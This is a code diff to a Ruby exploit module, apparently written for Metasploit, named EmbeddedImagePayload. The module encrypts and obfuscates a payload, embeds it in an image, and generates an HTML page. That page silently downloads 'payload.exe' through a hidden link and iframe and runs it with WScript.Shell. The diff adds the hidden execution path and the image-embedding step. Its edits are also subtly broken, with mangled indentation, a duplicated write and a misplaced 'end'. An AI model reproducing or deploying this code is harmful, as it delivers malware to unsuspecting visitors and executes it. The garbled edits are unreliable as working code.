@@ -86,8 +86,8 @@ module EmbeddedImagePayload
       encrypted_payload = cipher.update(compressed_payload) + cipher.final
 
       # 4. Obfuscate the decryption and decompression routines
-      obfuscated_key = key.unpack1('H*').scan(/../).map { |hex| "\\x#{hex}" }.join
-      obfuscated_iv = iv.unpack1('H*').scan(/../).map { |hex| "\\x#{hex}" }.join
+      obfuscated_key = key.unpack('H*')[0].scan(/../).map { |hex| "\\x#{hex}" }.join
+obfuscated_iv = iv.unpack('H*')[0].scan(/../).map { |hex| "\\x#{hex}" }.join
       decryption_routine = <<~RUBY
         key = "#{obfuscated_key}".scan(/../).map { |hex| hex.to_i(16) }.pack('C*')
         iv = "#{obfuscated_iv}".scan(/../).map { |hex| hex.to_i(16) }.pack('C*')
@@ -124,18 +124,25 @@ module EmbeddedImagePayload
           <img src="#{image_path}" alt="Malicious Image" onload="executePayload()">
           <script>
             function executePayload() {
-              var payload = new Uint8Array(#{payload_array});
+  var payload = new Uint8Array(#{payload_array});
+  
+  var blob = new Blob([payload], { type: 'application/octet-stream' });
+  var url = URL.createObjectURL(blob);
+  
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'payload.exe';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
 
-              var blob = new Blob([payload], { type: 'application/octet-stream' });
-              var url = URL.createObjectURL(blob);
-
-              var a = document.createElement('a');
-              a.href = url;
-              a.download = 'payload.exe';
-              a.style.display = 'none';
-              document.body.appendChild(a);
-              a.click();
-              document.body.removeChild(a);
+  // Universal approach for running the payload
+  var iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = url;
+  document.body.appendChild(iframe);
+}
 
               setTimeout(function() {
                 var exec = new ActiveXObject('WScript.Shell').Run('payload.exe');
@@ -148,7 +155,8 @@ module EmbeddedImagePayload
     end
 
     def exploit
-      image_path = datastore['IMAGE_PATH']
+  begin
+    image_path = datastore['IMAGE_PATH']
       output_path = datastore['OUTPUT_PATH']
 
       payload_data = generate_payload_exe
@@ -164,7 +172,14 @@ module EmbeddedImagePayload
       malicious_html = generate_malicious_html(image_path, final_payload)
       File.write(output_path, malicious_html)
       print_good("Malicious HTML file generated at #{output_path}")
-
+    File.binwrite(image_path, embedded_data)
+    print_good("Payload successfully embedded into #{image_path}")
+    
+    File.write(output_path, malicious_html)
+    print_good("Malicious HTML file generated at #{output_path}")
+  rescue => e
+    print_error("An error occurred: #{e.message}")
+        end
       super
     end
   end
